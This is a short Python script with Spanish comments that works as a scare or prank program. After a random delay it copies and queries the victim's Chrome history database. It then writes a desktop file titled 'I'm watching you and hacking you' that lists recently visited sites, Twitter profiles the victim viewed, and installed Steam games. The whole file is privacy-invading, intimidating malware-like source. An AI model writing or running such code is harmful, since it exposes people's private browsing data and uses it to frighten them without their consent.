import os
from time import sleep
from pathlib import Path
from random import randrange
import sqlite3
import re
import glob
from shutil import copyfile

HACKERFILE_NAME = "PARA_TI.txt"

def get_userpath():
    return "{}/" .format(Path.home())

def duermeterrrl():
    n_horas = randrange(1,4)
    print("Dormiendo: {}".format(n_horas))
    sleep(n_horas)

def crear_hackerfile(userpath):
    hackerfile = open(userpath + "Desktop/" + HACKERFILE_NAME,"w")
    hackerfile.write("Te miro y te jaqueo\n")
    return hackerfile

def historial_chrome(userpath):
    urls = None
    while not urls:
        try:
            historial = userpath + "/AppData/Local/Google/Chrome/User Data/Default/History"
            copia = historial + "temp"
            copyfile(historial, copia)
            conection = sqlite3.connect(copia)
            cursor = conection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            conection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando...")
            sleep(5)
        
def scare_usr(hackerfile, chromehistory):
    for item in chromehistory[:10]:
        hackerfile.write("Pos paese ser que has visitao la web {}\n" .format(item[0]))

def scare_twiter(hackerfile, chromehistory):
    perfiles_visitados = []
    for item in chromehistory:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "explore"]:
            perfiles_visitados.append(results[0])
    hackerfile.write("Pos paese ser que has stakeado a esta gentuza a {}\n" .format(",".join(perfiles_visitados)))
        
#def scare_yutuf(hackerfile, chromehistory):
 #   canales_visitados = []
  #  for item in chromehistory:
   #     canales = re.findall("([A-Za-z0-9]+) - Youtube", item[0])
    #    if canales:
     #       canales_visitados.append(canales[0])
  #  hackerfile.write("Y has visto a esta gentuza {}\n" .format(",".join(canales_visitados)))

def games_steam(hackerfile):
    try:
        ruta_steam = "C:/Program Files (x86)/Steam/steamapps/common"
        games = os.listdir(ruta_steam)
        hackerfile.write("Y a esto: {} te pasas el dia jugando" .format(", ".join(games)))
    except:
        return None

def main():
    #Esperamos algo de tiemporl
    duermeterrrl()
    #Calculamos la ruta del usuario de guindous
    userpath = get_userpath()
    
    #Creamos un archivo en el escritorio
    hackerfile = crear_hackerfile(userpath)
    #Recogemos su historial del google
    chromehistory = historial_chrome(userpath)
    #Escribiendo
    scare_usr(hackerfile, chromehistory)
    scare_twiter(hackerfile, chromehistory)
  #  scare_yutuf(hackerfile, chromehistory)
    games_steam(hackerfile)
    hackerfile.close()


if __name__ == "__main__":
    main()
